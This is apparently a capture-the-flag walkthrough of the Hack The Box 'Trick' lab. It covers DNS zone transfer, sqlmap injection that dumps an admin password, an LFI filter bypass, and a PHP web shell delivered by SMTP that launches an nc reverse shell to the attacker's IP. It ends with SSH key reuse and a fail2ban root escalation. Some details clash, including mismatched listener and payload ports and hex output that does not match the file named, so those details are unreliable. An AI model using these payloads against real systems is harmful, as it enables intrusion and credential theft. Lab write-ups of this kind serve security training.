## Trick

### Lab Details 

- Difficulty: Easy
- Type: DNS, SQLi, LFI, Priv Esc, Linux

#### Enumeration
- run nmap
```
$ nmap -sT -T4 -vv -A -Pn 10.10.11.166
PORT      STATE    SERVICE       REASON      VERSION
22/tcp    filtered ssh           no-response
25/tcp    open     smtp          syn-ack     Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp    open     domain        syn-ack     ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp    open     http          syn-ack     nginx 1.14.2
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
```
- enumerate port 80
	- directory scan
		- nothing usual was found
- attempt to connect to port 23 (telnet), connection refused
```
$ nc -nv 10.10.11.166 23
(UNKNOWN) [10.10.11.166] 23 (telnet) : Connection refused

$ telnet 10.10.11.166 
Trying 10.10.11.166...
telnet: Unable to connect to remote host: Connection refused
```
- enumerate DNS on target
	- perform reverse DNS lookup
```
$ dig @10.10.11.166 -x 10.10.11.166

; <<>> DiG 9.20.4-4-Debian <<>> @10.10.11.166 -x 10.10.11.166
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42942
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: b1b75956a555aded148999c3688aebcee08da5b4a0555856 (good)
;; QUESTION SECTION:
;166.11.10.10.in-addr.arpa.     IN      PTR

;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.

;; AUTHORITY SECTION:
11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 300 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
;; WHEN: Wed Jul 30 21:30:32 PDT 2025
;; MSG SIZE  rcvd: 163
```
- try to perform a zone transfer 
	- we get another domain `preprod-payroll.trick.htb`
```
$ dig @10.10.11.166 axfr trick.htb

; <<>> DiG 9.20.4-4-Debian <<>> @10.10.11.166 axfr trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 428 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Thu Jul 31 07:32:30 PDT 2025
;; XFR size: 6 records (messages 1, bytes 231)

```
- enumerate subdomain `preprod-payroll.trick.htb`
	- upon visiting `preprod-payroll.trick.htb`, we are presented with a login page
![[login.png]]
	-  inspect page source, the page has title `<title>Admin | Employee's Payroll Management System</title>`
	- search for `Payroll Management System`, found a SQLi vulnerability for `Simple Payroll System` : https://www.exploit-db.com/exploits/50403
	- performed the attack and we are able to bypass the login which confirms the SQLi vulnerability
- investigate the SQLi vulnerability using `SQLmap`
	- captured the `GET` request from burpsuite 
```
$ cat trick_post
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
Content-Length: 32
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Origin: http://preprod-payroll.trick.htb
Referer: http://preprod-payroll.trick.htb/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=0dtl5f8vhj96akfk906okirbcq
Connection: keep-alive

username=&password=

## listing the tables in payroll_db
$ sqlmap -r ./trick_post -D payroll_db --tables --level 5 --risk 3 -p username --batch

Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
## listing the entries in users table
Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type   | address | contact | password              | username   |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+

## checking current user privilege
$ sqlmap -r ./trick_post --privileges --level 5 --risk 3 -p username --batch
<snip>
[02:50:23] [INFO] retrieved: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
<snip>

## look for files that might provide more info
$ sqlmap -r ./trick_post -p username --batch --file-read=/etc/nginx/sites-enabled/default
726F6F743A783A303A303A726F6F743A2F726F6F743A2F62696E2F626173680A6461656D6F6E3A783A313A313A6461656D6F6E3A2F7573722F7362696E3A2F7573722F7362696E2F6E6F6C6F67696E0A62696E3A783A323A323A62696E3A2F62696E3A2F7573722F7362696E2F68693A783A3131313A3132303A4176616869206D444E53206461656D6F6E2C2C2C3A2F7661
<snip>
```
	- we get the hex output of the  `/etc/nginx/sites-enabled/default`, we can use `cyberchef` to decode the output, which shows another subdomain named `preprod-marketing.trick.htb`
```
<snip>
server {
	listen 80;
	listen [::]:80;

	server_name preprod-marketing.trick.htb;

	root /var/www/market;
	index index.php;
<snip>
```
- enumerate subdomain `preprod-marketing.trick.htb` 
	- when accessing a new section of the page such as services, the page loads `http://preprod-marketing.trick.htb/index.php?page=services.html`
	- `?page=` might be an indicator of `LFI` vulnerability 
	- tried below, which does not result in any response `http://preprod-marketing.trick.htb/index.php?page=../../../../../etc/passwd`
	- a filter is in place tried `http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd` was able to retrieve the `/etc/passwd` from remote
#### Initial Foothold 
- based on the output of nmap, there is a `SMTP` service running on port 25 we can try connect to it using `nc` and we can send an malicious payload to the user `michael` via `SMTP` and execute the payload using the `LFI` vulnerability
```
$ nc trick.htb 25
helo x
220 debian.localdomain ESMTP Postfix (Debian/GNU)
250 debian.localdomain
mail from: remo
250 2.1.0 Ok
rcpt to: michael
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']); ?>

.
250 2.0.0 Ok: queued as C5D974099C                               
```
- access the payload at `http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&cmd=nc%2010.10.16.22%209001%20-e%20/bin/sh`
- since new emails will be stored at `/var/mail/[username]`
```
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.11.166] 55930
whoami
michael
```
- there is a `id_rsa` file at `home/michael/.ssh`, we can ssh using the `id_rsa` private key
```
$ ssh michael@10.10.11.166 -i id_rsa
```
#### Lateral Movement (If any)

#### Privilege Escalation
- run `sudo -l`
- user `michael` is able to run `fail2ban restart` as root without password
```
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```
- based on this article: https://juggernaut-sec.com/fail2ban-lpe/
- we are able to perform privilege escalation for `fail2ban` <= 0.11.2
- following the guide we are able to get a root shell
```
michael@trick:/$ /tmp/bash -p
bash-5.0# whoami
root
```

#### Resources
- Simple Payroll System 1.0 - SQLi Authentication Bypass: https://www.exploit-db.com/exploits/50403
- `fail2ban` privilege escalation: https://juggernaut-sec.com/fail2ban-lpe/
#### Lesson Learned
